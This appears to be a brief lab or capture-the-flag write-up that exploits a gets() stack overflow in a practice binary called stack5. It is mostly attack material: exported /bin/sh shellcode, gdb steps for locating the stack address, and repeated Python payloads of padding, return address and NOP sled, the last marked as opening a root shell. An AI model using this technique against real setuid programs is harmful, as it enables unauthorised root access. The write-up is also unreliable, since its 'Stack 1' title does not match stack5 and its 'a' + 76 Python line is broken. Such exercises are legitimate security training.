Stack 1

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

<p> 
This task the same as stack 3, but we should to identify padding.
To find the padding we can just add bytes and test it
</p>

```shell
export SHELL_CODE="\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

python -c "print('a' + 76)" > ~/input5

gdb ./stack5
(gdb) break 11
(gdb) run < ~/input5
(gdb) x/48wx $esp # getting an address of next block after EIP 0xbffff630

# illegal instruction (missed)
python -c "print('A' * 76 + '30f6ffbf'.decode('hex') + '\x90' * 300 + '$SHELL_CODE')" | ./stack5

# illegal instruction (missed)
python -c "print('A' * 76 + '40f6ffbf'.decode('hex') + '\x90' * 300 + '$SHELL_CODE')" | ./stack5

# open root shell
python -c "print('A' * 76 + '50f6ffbf'.decode('hex') + '\x90' * 300 + '$SHELL_CODE')" | ./stack5
```
